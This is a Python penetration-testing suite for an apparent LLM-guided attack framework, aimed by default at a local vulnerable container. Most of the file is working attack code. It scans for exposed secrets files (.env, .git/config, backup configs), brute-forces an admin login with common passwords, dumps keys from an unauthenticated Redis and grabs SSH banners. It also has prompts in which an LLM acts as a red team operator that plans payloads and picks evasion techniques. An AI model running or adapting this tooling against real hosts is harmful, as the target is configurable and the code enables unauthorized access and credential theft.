#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════════════
# RAGLOX v3.0 - Live Penetration Testing Suite
# Real-world offensive security testing against vulnerable container
# ═══════════════════════════════════════════════════════════════════════════════
"""
This module performs REAL penetration testing against a vulnerable container.
It tests the complete RAGLOX offensive security pipeline including:
- LLM-guided attack planning
- Vulnerability scanning
- Attack execution
- Attack chain orchestration
- Post-exploitation activities

⚠️ WARNING: This is a live testing suite that performs actual attacks!
Only run against the designated vulnerable container.
"""

import asyncio
import json
import os
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
import subprocess
import socket
import requests
from urllib.parse import quote

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from src.core.config import get_settings
from src.core.llm.base import LLMConfig, ProviderType, LLMMessage
from src.core.llm.blackbox_provider import BlackboxAIProvider
from src.core.llm.prompts import REFLEXION_SYSTEM_PROMPT
from src.core.knowledge import EmbeddedKnowledge


# ═══════════════════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class TargetConfig:
    """Target container configuration."""
    host: str = "127.0.0.1"
    http_port: int = 8088  # Existing vulnerable container
    ssh_port: int = 2222
    mysql_port: int = 3307
    redis_port: int = 6379  # Redis running on default port
    
    @property
    def http_url(self) -> str:
        return f"http://{self.host}:{self.http_port}"
    
    @property
    def ssh_target(self) -> str:
        return f"{self.host}:{self.ssh_port}"


class AttackResult(Enum):
    """Attack execution result."""
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILED = "failed"
    SKIPPED = "skipped"
    ERROR = "error"


@dataclass
class AttackExecution:
    """Single attack execution result."""
    technique_id: str
    technique_name: str
    attack_type: str
    target: str
    command: Optional[str] = None
    payload: Optional[str] = None
    result: AttackResult = AttackResult.SKIPPED
    output: str = ""
    duration_ms: float = 0
    llm_analysis: Optional[str] = None
    next_steps: List[str] = field(default_factory=list)
    error: Optional[str] = None


@dataclass  
class TestReport:
    """Complete penetration test report."""
    start_time: datetime = field(default_factory=datetime.utcnow)
    end_time: Optional[datetime] = None
    target: Optional[TargetConfig] = None
    total_attacks: int = 0
    successful_attacks: int = 0
    partial_attacks: int = 0
    failed_attacks: int = 0
    attacks: List[AttackExecution] = field(default_factory=list)
    llm_requests: int = 0
    llm_tokens_used: int = 0
    llm_total_latency_ms: float = 0
    findings: List[Dict[str, Any]] = field(default_factory=list)
    
    @property
    def success_rate(self) -> float:
        if self.total_attacks == 0:
            return 0.0
        return (self.successful_attacks + self.partial_attacks * 0.5) / self.total_attacks * 100


# ═══════════════════════════════════════════════════════════════════════════════
# LLM Integration
# ═══════════════════════════════════════════════════════════════════════════════

class LLMAttackAnalyzer:
    """LLM-powered attack analysis and planning."""
    
    def __init__(self):
        self.settings = get_settings()
        self.provider: Optional[BlackboxAIProvider] = None
        self.stats = {
            "requests": 0,
            "tokens": 0,
            "latency_ms": 0,
        }
    
    async def initialize(self) -> bool:
        """Initialize LLM provider."""
        try:
            config = LLMConfig(
                provider_type=ProviderType.BLACKBOX,
                api_key=self.settings.effective_llm_api_key,
                api_base=self.settings.llm_api_base or 'https://api.blackbox.ai',
                model=self.settings.llm_model,
                temperature=0.3,
                max_tokens=2048,
            )
            self.provider = BlackboxAIProvider(config)
            return await self.provider.health_check()
        except Exception as e:
            print(f"LLM initialization failed: {e}")
            return False
    
    async def close(self):
        """Close LLM provider."""
        if self.provider:
            await self.provider.close()
    
    async def plan_attack(
        self,
        vulnerability: str,
        target: str,
        context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Use LLM to plan attack strategy."""
        prompt = f"""You are a professional red team operator planning an attack.

Target: {target}
Vulnerability Discovered: {vulnerability}

Context:
{json.dumps(context, indent=2)}

Analyze this vulnerability and provide:
1. MITRE ATT&CK Technique ID that matches this vulnerability
2. Attack vector to exploit it
3. Specific payload or command to test
4. Expected success indicators
5. Potential next steps if successful

Respond in JSON format ONLY (no markdown, no explanation):
{{
    "technique_id": "T1XXX.XXX",
    "technique_name": "Name",
    "attack_vector": "Description of attack approach",
    "payload": "Specific payload or command",
    "success_indicators": ["indicator1", "indicator2"],
    "next_steps": ["step1", "step2"],
    "risk_level": "high/medium/low",
    "stealth_level": "high/medium/low"
}}
"""
        
        try:
            messages = [
                LLMMessage.system(REFLEXION_SYSTEM_PROMPT),
                LLMMessage.user(prompt)
            ]
            response = await self.provider.generate(messages, max_tokens=800)
            
            self.stats["requests"] += 1
            if response.usage:
                self.stats["tokens"] += response.usage.total_tokens
            self.stats["latency_ms"] += response.latency_ms
            
            # Parse JSON from response
            content = response.content
            if "```json" in content:
                content = content.split("```json")[1].split("```")[0]
            elif "```" in content:
                content = content.split("```")[1].split("```")[0]
            
            return json.loads(content.strip())
        except Exception as e:
            return {"error": str(e)}
    
    async def analyze_result(
        self,
        attack: AttackExecution,
        output: str
    ) -> Dict[str, Any]:
        """Use LLM to analyze attack results."""
        prompt = f"""You are a red team analyst reviewing an attack result.

Attack Details:
- Technique: {attack.technique_id} - {attack.technique_name}
- Type: {attack.attack_type}
- Target: {attack.target}
- Payload Used: {attack.payload or attack.command or 'N/A'}

Execution Output:
{output[:1500]}

Analyze the result and determine:
1. Was the attack successful?
2. What data or access was obtained?
3. Were there any defenses detected?
4. What should be the next attack step?

Respond in JSON format ONLY:
{{
    "success": true/false,
    "success_level": "full/partial/none",
    "data_obtained": ["item1", "item2"],
    "defenses_detected": ["defense1"],
    "analysis": "Brief analysis",
    "recommended_next_steps": ["step1", "step2"],
    "privilege_level_achieved": "none/user/admin/root"
}}
"""
        
        try:
            messages = [
                LLMMessage.system(REFLEXION_SYSTEM_PROMPT),
                LLMMessage.user(prompt)
            ]
            response = await self.provider.generate(messages, max_tokens=600)
            
            self.stats["requests"] += 1
            if response.usage:
                self.stats["tokens"] += response.usage.total_tokens
            self.stats["latency_ms"] += response.latency_ms
            
            content = response.content
            if "```json" in content:
                content = content.split("```json")[1].split("```")[0]
            elif "```" in content:
                content = content.split("```")[1].split("```")[0]
            
            return json.loads(content.strip())
        except Exception as e:
            return {"error": str(e), "raw_output": output[:500]}
    
    async def select_evasion_technique(
        self,
        detected_defense: str,
        current_technique: str
    ) -> Dict[str, Any]:
        """Use LLM to select evasion technique."""
        prompt = f"""You are a red team operator who encountered a defense.

Defense Detected: {detected_defense}
Current Attack Technique: {current_technique}

Suggest an evasion technique to bypass this defense.

Respond in JSON format ONLY:
{{
    "evasion_technique_id": "T1XXX.XXX",
    "evasion_name": "Name",
    "description": "How to evade",
    "specific_action": "Command or action to take",
    "alternative_attack": "Alternative approach if evasion fails"
}}
"""
        
        try:
            messages = [
                LLMMessage.system(REFLEXION_SYSTEM_PROMPT),
                LLMMessage.user(prompt)
            ]
            response = await self.provider.generate(messages, max_tokens=500)
            
            self.stats["requests"] += 1
            if response.usage:
                self.stats["tokens"] += response.usage.total_tokens
            self.stats["latency_ms"] += response.latency_ms
            
            content = response.content
            if "```json" in content:
                content = content.split("```json")[1].split("```")[0]
            elif "```" in content:
                content = content.split("```")[1].split("```")[0]
            
            return json.loads(content.strip())
        except Exception as e:
            return {"error": str(e)}


# ═══════════════════════════════════════════════════════════════════════════════
# Attack Executors
# ═══════════════════════════════════════════════════════════════════════════════

class AttackExecutor:
    """Executes actual attacks against target."""
    
    def __init__(self, target: TargetConfig, llm: LLMAttackAnalyzer):
        self.target = target
        self.llm = llm
        self.session = requests.Session()
        self.session.timeout = 10
    
    def check_target_reachable(self) -> bool:
        """Check if target is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target.host, self.target.http_port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    # ═══════════════════════════════════════════════════════════════
    # Information Disclosure Attacks
    # ═══════════════════════════════════════════════════════════════
    
    async def attack_info_disclosure(self) -> AttackExecution:
        """Test Information Disclosure vulnerabilities."""
        attack = AttackExecution(
            technique_id="T1592",
            technique_name="Gather Victim Host Information",
            attack_type="Information Disclosure",
            target=self.target.http_url
        )
        
        start_time = time.time()
        outputs = []
        findings = []
        success_count = 0
        
        # Test endpoints
        endpoints = [
            ("/", "Index page"),
            ("/info", "Info endpoint"),
            ("/backup/config.bak", "Backup config"),
            ("/server-status", "Server status"),
            ("/admin/", "Admin panel"),
            ("/.env", "Environment file"),
            ("/.git/config", "Git config"),
        ]
        
        for path, desc in endpoints:
            try:
                response = self.session.get(
                    f"{self.target.http_url}{path}",
                    allow_redirects=True,
                    timeout=5
                )
                
                outputs.append(f"[{desc}] {path} -> Status: {response.status_code}")
                
                if response.status_code == 200:
                    text = response.text
                    
                    # Check for sensitive info
                    if "password" in text.lower() or "secret" in text.lower():
                        success_count += 1
                        outputs.append(f"  [+] Credentials/secrets found!")
                        findings.append({"type": "credentials", "path": path})
                        for line in text.split("\n"):
                            if "pass" in line.lower() or "secret" in line.lower():
                                outputs.append(f"  [SECRET] {line.strip()[:60]}")
                    elif "debug" in text.lower() and "true" in text.lower():
                        success_count += 0.5
                        outputs.append(f"  [+] Debug mode enabled!")
                        findings.append({"type": "debug", "path": path})
                    elif "admin" in text.lower() and response.status_code == 200:
                        success_count += 0.5
                        outputs.append(f"  [+] Admin panel accessible!")
                        findings.append({"type": "admin_panel", "path": path})
                    elif "Active connections" in text:
                        success_count += 0.3
                        outputs.append(f"  [+] Server status exposed!")
                        
            except Exception as e:
                outputs.append(f"[{desc}] Error: {str(e)[:30]}")
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        if success_count >= 2:
            attack.result = AttackResult.SUCCESS
        elif success_count > 0:
            attack.result = AttackResult.PARTIAL
        else:
            attack.result = AttackResult.FAILED
        
        # Get LLM analysis
        analysis = await self.llm.analyze_result(attack, attack.output)
        attack.llm_analysis = json.dumps(analysis, indent=2)
        attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_directory_listing(self) -> AttackExecution:
        """Test Directory Listing vulnerability."""
        attack = AttackExecution(
            technique_id="T1083",
            technique_name="File and Directory Discovery",
            attack_type="Directory Listing",
            target=f"{self.target.http_url}/backup/"
        )
        
        start_time = time.time()
        outputs = []
        
        try:
            response = self.session.get(attack.target, timeout=5)
            outputs.append(f"[Directory Listing] Status: {response.status_code}")
            
            if "Index of" in response.text:
                attack.result = AttackResult.SUCCESS
                outputs.append("[+] SUCCESS: Directory listing enabled!")
                
                # Extract files
                import re
                files = re.findall(r'href="([^"]+)"', response.text)
                for f in files:
                    if not f.startswith(".."):
                        outputs.append(f"  [FILE] {f}")
            else:
                attack.result = AttackResult.FAILED
                outputs.append("[-] Directory listing disabled")
                
        except Exception as e:
            attack.result = AttackResult.ERROR
            attack.error = str(e)
            outputs.append(f"[Error] {str(e)}")
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        # Get LLM analysis
        if attack.result == AttackResult.SUCCESS:
            analysis = await self.llm.analyze_result(attack, attack.output)
            attack.llm_analysis = json.dumps(analysis, indent=2)
            attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_sensitive_file_exposure(self) -> AttackExecution:
        """Test Sensitive File Exposure."""
        attack = AttackExecution(
            technique_id="T1005",
            technique_name="Data from Local System",
            attack_type="Sensitive File Exposure",
            target=f"{self.target.http_url}/backup/config.bak"
        )
        
        start_time = time.time()
        outputs = []
        
        try:
            response = self.session.get(attack.target, timeout=5)
            outputs.append(f"[Config Backup] Status: {response.status_code}")
            
            if response.status_code == 200 and len(response.text) > 0:
                attack.result = AttackResult.SUCCESS
                outputs.append("[+] SUCCESS: Sensitive file accessible!")
                outputs.append(f"[CONTENT] {response.text[:200]}")
                attack.payload = response.text
            else:
                attack.result = AttackResult.FAILED
                outputs.append("[-] File not accessible")
                
        except Exception as e:
            attack.result = AttackResult.ERROR
            attack.error = str(e)
            outputs.append(f"[Error] {str(e)}")
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        # Get LLM analysis
        analysis = await self.llm.analyze_result(attack, attack.output)
        attack.llm_analysis = json.dumps(analysis, indent=2)
        attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_admin_bruteforce(self) -> AttackExecution:
        """Test Admin Panel with common credentials."""
        attack = AttackExecution(
            technique_id="T1110.001",
            technique_name="Brute Force: Password Guessing",
            attack_type="Admin Panel Bruteforce",
            target=f"{self.target.http_url}/admin/"
        )
        
        start_time = time.time()
        outputs = []
        
        # Common credentials to try
        credentials = [
            ("admin", "admin"),
            ("admin", "admin123"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", "secret123"),
            ("admin", "backup_password"),
        ]
        
        success = False
        
        for username, password in credentials:
            try:
                response = self.session.post(
                    attack.target,
                    data={"username": username, "password": password},
                    allow_redirects=False,
                    timeout=5
                )
                
                outputs.append(f"[{username}:{password}] Status: {response.status_code}")
                
                # Check for successful login indicators
                if response.status_code in [200, 302]:
                    if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                        success = True
                        attack.payload = f"{username}:{password}"
                        outputs.append(f"  [+] SUCCESS: Valid credentials!")
                        break
                    elif response.status_code == 302:
                        # Follow redirect to check
                        redirect_url = response.headers.get("Location", "")
                        outputs.append(f"  [?] Redirect to: {redirect_url}")
                        if "dashboard" in redirect_url.lower() or "admin" in redirect_url.lower():
                            success = True
                            attack.payload = f"{username}:{password}"
                            outputs.append(f"  [+] SUCCESS: Valid credentials!")
                            break
                            
            except Exception as e:
                outputs.append(f"[{username}:{password}] Error: {str(e)[:30]}")
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        if success:
            attack.result = AttackResult.SUCCESS
        else:
            attack.result = AttackResult.FAILED
        
        # Get LLM analysis
        analysis = await self.llm.analyze_result(attack, attack.output)
        attack.llm_analysis = json.dumps(analysis, indent=2)
        attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_service_enumeration(self) -> AttackExecution:
        """Test Service Enumeration via Server Status."""
        attack = AttackExecution(
            technique_id="T1046",
            technique_name="Network Service Scanning",
            attack_type="Service Enumeration",
            target=f"{self.target.http_url}/server-status"
        )
        
        start_time = time.time()
        outputs = []
        
        try:
            response = self.session.get(attack.target, timeout=5)
            outputs.append(f"[Server Status] Status: {response.status_code}")
            
            if response.status_code == 200:
                attack.result = AttackResult.SUCCESS
                outputs.append("[+] SUCCESS: Server status exposed!")
                outputs.append(f"[INFO] {response.text[:500]}")
                
                # Parse server stats
                if "Active connections" in response.text:
                    outputs.append("[+] nginx status page exposed")
                    
            else:
                attack.result = AttackResult.FAILED
                outputs.append("[-] Server status not accessible")
                
        except Exception as e:
            attack.result = AttackResult.ERROR
            attack.error = str(e)
            outputs.append(f"[Error] {str(e)}")
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        # Get LLM analysis
        if attack.result == AttackResult.SUCCESS:
            analysis = await self.llm.analyze_result(attack, attack.output)
            attack.llm_analysis = json.dumps(analysis, indent=2)
            attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_redis_noauth(self) -> AttackExecution:
        """Test Redis without authentication."""
        attack = AttackExecution(
            technique_id="T1021.006",
            technique_name="Remote Services",
            attack_type="Redis Unauthorized Access",
            target=f"{self.target.host}:{self.target.redis_port}"
        )
        
        start_time = time.time()
        outputs = []
        
        try:
            # Connect to Redis
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target.host, self.target.redis_port))
            
            # Send INFO command
            sock.send(b"INFO\r\n")
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            
            if "redis_version" in response:
                outputs.append("[+] SUCCESS: Redis accessible without auth!")
                attack.result = AttackResult.SUCCESS
                
                # Extract useful info
                for line in response.split("\r\n")[:20]:
                    if any(k in line for k in ["redis_version", "os:", "process_id", "connected_clients", "used_memory"]):
                        outputs.append(f"  [INFO] {line}")
                
                # Try to get keys
                sock.send(b"KEYS *\r\n")
                keys_response = sock.recv(4096).decode('utf-8', errors='ignore')
                outputs.append(f"  [KEYS] {keys_response[:200]}")
            else:
                outputs.append("[-] Redis requires authentication or blocked")
                attack.result = AttackResult.FAILED
                
            sock.close()
            
        except ConnectionRefusedError:
            outputs.append("[-] Redis port closed")
            attack.result = AttackResult.FAILED
        except Exception as e:
            outputs.append(f"[Error] {str(e)}")
            attack.result = AttackResult.FAILED
            attack.error = str(e)
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        # Get LLM analysis
        if attack.result == AttackResult.SUCCESS:
            analysis = await self.llm.analyze_result(attack, attack.output)
            attack.llm_analysis = json.dumps(analysis, indent=2)
            attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_ssh_bruteforce(self) -> AttackExecution:
        """Test SSH with common credentials."""
        attack = AttackExecution(
            technique_id="T1110.001",
            technique_name="Brute Force: Password Guessing",
            attack_type="SSH Bruteforce",
            target=f"{self.target.host}:{self.target.ssh_port}"
        )
        
        start_time = time.time()
        outputs = []
        
        # Check if SSH port is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target.host, self.target.ssh_port))
            sock.close()
            
            if result != 0:
                outputs.append("[-] SSH port closed")
                attack.result = AttackResult.SKIPPED
                attack.output = "\n".join(outputs)
                attack.duration_ms = (time.time() - start_time) * 1000
                return attack
                
            outputs.append("[+] SSH port open")
            
            # Try to grab banner
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target.host, self.target.ssh_port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            outputs.append(f"[BANNER] {banner.strip()}")
            
            # Note: Actual SSH brute force would require paramiko or similar
            # For safety, we just indicate the vulnerability exists
            outputs.append("[!] SSH accessible - would test credentials")
            
            # Common weak credentials for logging
            test_creds = [
                ("root", "toor"),
                ("admin", "admin"),
                ("user", "password"),
            ]
            outputs.append(f"[INFO] Would test {len(test_creds)} credential pairs")
            
            attack.result = AttackResult.PARTIAL  # Port open = partial success
            
        except Exception as e:
            outputs.append(f"[Error] {str(e)}")
            attack.result = AttackResult.ERROR
            attack.error = str(e)
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        # Get LLM analysis
        analysis = await self.llm.analyze_result(attack, attack.output)
        attack.llm_analysis = json.dumps(analysis, indent=2)
        attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack
    
    async def attack_api_info_disclosure(self) -> AttackExecution:
        """Test API Information Disclosure."""
        attack = AttackExecution(
            technique_id="T1082",
            technique_name="System Information Discovery",
            attack_type="API Information Disclosure",
            target=f"{self.target.http_url}/info"
        )
        
        start_time = time.time()
        outputs = []
        
        try:
            response = self.session.get(attack.target, timeout=5)
            outputs.append(f"[API Info] Status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    outputs.append("[+] SUCCESS: JSON info exposed!")
                    
                    # Check for sensitive fields
                    sensitive_fields = ["debug", "version", "admin", "hostname", "email"]
                    for key, value in data.items():
                        if any(s in key.lower() for s in sensitive_fields):
                            outputs.append(f"  [SENSITIVE] {key}: {value}")
                    
                    if data.get("debug") == True:
                        outputs.append("  [!] Debug mode is ENABLED!")
                        attack.result = AttackResult.SUCCESS
                    else:
                        attack.result = AttackResult.PARTIAL
                        
                except json.JSONDecodeError:
                    outputs.append("[-] Not JSON response")
                    attack.result = AttackResult.FAILED
            else:
                attack.result = AttackResult.FAILED
                outputs.append("[-] Info endpoint not accessible")
                
        except Exception as e:
            attack.result = AttackResult.ERROR
            attack.error = str(e)
            outputs.append(f"[Error] {str(e)}")
        
        attack.output = "\n".join(outputs)
        attack.duration_ms = (time.time() - start_time) * 1000
        
        # Get LLM analysis
        analysis = await self.llm.analyze_result(attack, attack.output)
        attack.llm_analysis = json.dumps(analysis, indent=2)
        attack.next_steps = analysis.get("recommended_next_steps", [])
        
        return attack


# ═══════════════════════════════════════════════════════════════════════════════
# Main Test Runner
# ═══════════════════════════════════════════════════════════════════════════════

class LivePenetrationTester:
    """Main penetration testing orchestrator."""
    
    def __init__(self, target: TargetConfig):
        self.target = target
        self.llm = LLMAttackAnalyzer()
        self.executor: Optional[AttackExecutor] = None
        self.report = TestReport(target=target)
        self.knowledge = EmbeddedKnowledge()
    
    async def initialize(self) -> bool:
        """Initialize testing environment."""
        print("\n" + "=" * 70)
        print("RAGLOX v3.0 - Live Penetration Testing Suite")
        print("=" * 70)
        
        # Check LLM
        print("\n[*] Initializing LLM...")
        llm_ok = await self.llm.initialize()
        if llm_ok:
            print("[+] LLM connected successfully")
        else:
            print("[!] LLM failed - tests will run without AI analysis")
        
        # Check target
        print(f"\n[*] Checking target: {self.target.http_url}")
        self.executor = AttackExecutor(self.target, self.llm)
        
        if self.executor.check_target_reachable():
            print("[+] Target is reachable")
            return True
        else:
            print("[-] Target is NOT reachable!")
            print("    Make sure the vulnerable container is running:")
            print("    docker ps | grep raglox-vulnerable-target")
            return False
    
    async def run_reconnaissance(self) -> List[AttackExecution]:
        """Run reconnaissance phase attacks."""
        print("\n" + "-" * 50)
        print("Phase 1: Reconnaissance & Information Gathering")
        print("-" * 50)
        
        attacks = []
        
        attack_functions = [
            ("Information Disclosure", self.executor.attack_info_disclosure),
            ("API Info Disclosure", self.executor.attack_api_info_disclosure),
            ("Directory Listing", self.executor.attack_directory_listing),
            ("Service Enumeration", self.executor.attack_service_enumeration),
        ]
        
        for name, func in attack_functions:
            print(f"\n[*] Testing {name}...")
            try:
                attack = await func()
                attacks.append(attack)
                
                if attack.result == AttackResult.SUCCESS:
                    print(f"    [+] SUCCESS - {attack.technique_id}")
                elif attack.result == AttackResult.PARTIAL:
                    print(f"    [~] PARTIAL - {attack.technique_id}")
                else:
                    print(f"    [-] FAILED - {attack.technique_id}")
                    
            except Exception as e:
                print(f"    [!] ERROR: {str(e)[:50]}")
        
        return attacks
    
    async def run_exploitation(self) -> List[AttackExecution]:
        """Run exploitation phase attacks."""
        print("\n" + "-" * 50)
        print("Phase 2: Initial Access & Exploitation")
        print("-" * 50)
        
        attacks = []
        
        attack_functions = [
            ("Sensitive File Exposure", self.executor.attack_sensitive_file_exposure),
            ("Admin Panel Bruteforce", self.executor.attack_admin_bruteforce),
            ("Redis NoAuth", self.executor.attack_redis_noauth),
            ("SSH Reconnaissance", self.executor.attack_ssh_bruteforce),
        ]
        
        for name, func in attack_functions:
            print(f"\n[*] Testing {name}...")
            try:
                attack = await func()
                attacks.append(attack)
                
                if attack.result == AttackResult.SUCCESS:
                    print(f"    [+] SUCCESS - {attack.technique_id}")
                elif attack.result == AttackResult.PARTIAL:
                    print(f"    [~] PARTIAL - {attack.technique_id}")
                elif attack.result == AttackResult.SKIPPED:
                    print(f"    [.] SKIPPED - {attack.technique_id}")
                else:
                    print(f"    [-] FAILED - {attack.technique_id}")
                    
            except Exception as e:
                print(f"    [!] ERROR: {str(e)[:50]}")
        
        return attacks
    
    async def run_full_assessment(self) -> TestReport:
        """Run complete penetration test."""
        if not await self.initialize():
            return self.report
        
        # Run attacks
        recon_attacks = await self.run_reconnaissance()
        exploit_attacks = await self.run_exploitation()
        
        # Compile report
        all_attacks = recon_attacks + exploit_attacks
        self.report.attacks = all_attacks
        self.report.total_attacks = len(all_attacks)
        self.report.successful_attacks = sum(1 for a in all_attacks if a.result == AttackResult.SUCCESS)
        self.report.partial_attacks = sum(1 for a in all_attacks if a.result == AttackResult.PARTIAL)
        self.report.failed_attacks = sum(1 for a in all_attacks if a.result == AttackResult.FAILED)
        self.report.end_time = datetime.utcnow()
        
        # LLM stats
        self.report.llm_requests = self.llm.stats["requests"]
        self.report.llm_tokens_used = self.llm.stats["tokens"]
        self.report.llm_total_latency_ms = self.llm.stats["latency_ms"]
        
        # Cleanup
        await self.llm.close()
        
        return self.report
    
    def print_report(self):
        """Print final report."""
        print("\n" + "=" * 70)
        print("PENETRATION TEST REPORT")
        print("=" * 70)
        
        duration = (self.report.end_time - self.report.start_time).total_seconds() if self.report.end_time else 0
        
        print(f"\nTarget: {self.report.target.http_url}")
        print(f"Duration: {duration:.1f} seconds")
        print(f"\nAttack Statistics:")
        print(f"  Total Attacks: {self.report.total_attacks}")
        print(f"  Successful:    {self.report.successful_attacks}")
        print(f"  Partial:       {self.report.partial_attacks}")
        print(f"  Failed:        {self.report.failed_attacks}")
        print(f"  Success Rate:  {self.report.success_rate:.1f}%")
        
        print(f"\nLLM Statistics:")
        print(f"  API Requests:  {self.report.llm_requests}")
        print(f"  Tokens Used:   {self.report.llm_tokens_used}")
        print(f"  Total Latency: {self.report.llm_total_latency_ms:.0f}ms")
        if self.report.llm_requests > 0:
            print(f"  Avg Latency:   {self.report.llm_total_latency_ms / self.report.llm_requests:.0f}ms")
        
        print("\nAttack Results:")
        print("-" * 60)
        
        for attack in self.report.attacks:
            status = {
                AttackResult.SUCCESS: "[+] SUCCESS",
                AttackResult.PARTIAL: "[~] PARTIAL",
                AttackResult.FAILED: "[-] FAILED ",
                AttackResult.ERROR: "[!] ERROR  ",
                AttackResult.SKIPPED: "[.] SKIPPED",
            }.get(attack.result, "[?] UNKNOWN")
            
            print(f"{status} | {attack.technique_id:12} | {attack.attack_type}")
            
            if attack.result in [AttackResult.SUCCESS, AttackResult.PARTIAL]:
                if attack.next_steps:
                    print(f"           | Next: {attack.next_steps[0][:45]}...")
        
        print("\n" + "=" * 70)
        
        # Print LLM analysis summary if available
        if self.report.llm_requests > 0:
            print("\nLLM ANALYSIS SUMMARY:")
            print("-" * 60)
            for attack in self.report.attacks:
                if attack.llm_analysis and attack.result == AttackResult.SUCCESS:
                    try:
                        analysis = json.loads(attack.llm_analysis)
                        print(f"\n{attack.attack_type}:")
                        if "analysis" in analysis:
                            print(f"  Analysis: {analysis.get('analysis', 'N/A')[:80]}")
                        if "data_obtained" in analysis and analysis["data_obtained"]:
                            print(f"  Data: {', '.join(analysis['data_obtained'][:3])}")
                    except:
                        pass
        
        print("\n" + "=" * 70)


# ═══════════════════════════════════════════════════════════════════════════════
# Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description="RAGLOX Live Penetration Testing")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--http-port", type=int, default=8088, help="HTTP port")
    parser.add_argument("--ssh-port", type=int, default=2222, help="SSH port")
    parser.add_argument("--redis-port", type=int, default=6379, help="Redis port")
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    
    args = parser.parse_args()
    
    target = TargetConfig(
        host=args.host,
        http_port=args.http_port,
        ssh_port=args.ssh_port,
        redis_port=args.redis_port,
    )
    
    tester = LivePenetrationTester(target)
    report = await tester.run_full_assessment()
    
    if args.json:
        # JSON output
        result = {
            "target": target.http_url,
            "duration_seconds": (report.end_time - report.start_time).total_seconds() if report.end_time else 0,
            "total_attacks": report.total_attacks,
            "successful": report.successful_attacks,
            "partial": report.partial_attacks,
            "failed": report.failed_attacks,
            "success_rate": report.success_rate,
            "llm_stats": {
                "requests": report.llm_requests,
                "tokens": report.llm_tokens_used,
                "latency_ms": report.llm_total_latency_ms,
            },
            "attacks": [
                {
                    "technique_id": a.technique_id,
                    "technique_name": a.technique_name,
                    "type": a.attack_type,
                    "result": a.result.value,
                    "duration_ms": a.duration_ms,
                    "next_steps": a.next_steps,
                }
                for a in report.attacks
            ]
        }
        print(json.dumps(result, indent=2))
    else:
        tester.print_report()
    
    return report.success_rate >= 30  # Return True if at least 30% success


if __name__ == "__main__":
    success = asyncio.run(main())
    sys.exit(0 if success else 1)
